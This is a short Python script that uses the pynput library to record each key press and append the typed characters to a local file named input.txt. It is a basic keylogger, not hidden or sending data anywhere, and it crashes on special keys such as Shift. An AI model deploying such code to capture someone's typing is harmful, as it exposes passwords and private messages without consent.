from pynput.keyboard import Key, Listener
import os


def on_press(key):
    file = open("input.txt", "a+")
    print(key)
    # print(type(key))
    file.write(key.char+"\n")


f = open('input.txt', 'r+')
f.truncate(0) # need '0' when using r+

with Listener(on_press=on_press) as listener:
    listener.join()
